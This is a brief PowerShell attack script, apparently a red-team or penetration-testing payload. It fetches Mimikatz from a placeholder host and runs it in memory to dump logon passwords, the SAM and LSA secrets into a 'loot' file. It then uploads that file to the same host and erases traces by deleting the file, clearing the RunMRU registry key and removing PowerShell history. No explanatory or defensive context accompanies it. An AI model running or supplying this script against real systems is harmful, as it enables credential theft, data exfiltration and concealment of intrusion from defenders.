irm http://<ip>:<port>/mimikatz.ps1 -usebasicparsing | iex; Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "exit"' > $env:TEMP\loot.txt
$url = "http://<ip>:<port>/"
$file = "$env:TEMP\loot.txt"
Invoke-WebRequest -Uri $url -Method POST -InFile $file
Remove-Item -Path $file -Force
Start-Process -NoNewWindow -Wait -FilePath "reg.exe" -ArgumentList "DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
$historyFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Remove-Item -Path $historyFilePath -Force
exit
